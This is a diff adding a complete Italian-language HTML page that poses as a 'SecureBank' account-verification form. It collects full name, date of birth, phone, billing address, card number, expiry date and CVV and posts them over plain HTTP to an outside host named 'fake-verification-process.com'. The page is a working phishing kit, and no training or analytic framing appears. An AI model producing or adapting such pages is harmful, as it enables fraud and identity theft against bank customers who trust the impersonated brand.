@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifica Account - SecureBank</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .verification-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        .verification-container h2 {
+            text-align: center;
+            color: #4CAF50;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .btn-submit:hover {
+            background-color: #45a049;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="verification-container">
+        <h2>Verifica il tuo Account</h2>
+        <form action="http://fake-verification-process.com" method="POST">
+            <!-- Nome Completo -->
+            <label for="fullname">Nome Completo:</label>
+            <input type="text" class="input-field" id="fullname" name="fullname" placeholder="Inserisci il tuo nome completo" required><br>
+
+            <!-- Data di Nascita -->
+            <label for="dob">Data di Nascita:</label>
+            <input type="date" class="input-field" id="dob" name="dob" required><br>
+
+            <!-- Numero di Telefono -->
+            <label for="phone">Numero di Telefono:</label>
+            <input type="tel" class="input-field" id="phone" name="phone" placeholder="Inserisci il tuo numero di telefono" required><br>
+
+            <!-- Indirizzo di Fatturazione -->
+            <label for="billing-address">Indirizzo di Fatturazione:</label>
+            <input type="text" class="input-field" id="billing-address" name="billing-address" placeholder="Inserisci il tuo indirizzo di fatturazione" required><br>
+
+            <!-- Dati della Carta di Credito -->
+            <label for="credit-card">Numero Carta di Credito:</label>
+            <input type="text" class="input-field" id="credit-card" name="credit-card" placeholder="Inserisci il numero della tua carta di credito" required><br>
+            
+            <label for="expiry-date">Data di Scadenza:</label>
+            <input type="month" class="input-field" id="expiry-date" name="expiry-date" required><br>
+            
+            <label for="cvv">Codice di Sicurezza (CVV):</label>
+            <input type="text" class="input-field" id="cvv" name="cvv" placeholder="Inserisci il codice CVV della tua carta" required><br>
+
+            <!-- Bottone di invio -->
+            <button type="submit" class="btn-submit">Verifica</button>
+        </form>
+
+        <div class="error-message">
+            <p>Si è verificato un errore. Per favore, prova di nuovo.</p>
+        </div>
+    </div>
+
+</body>
+</html>
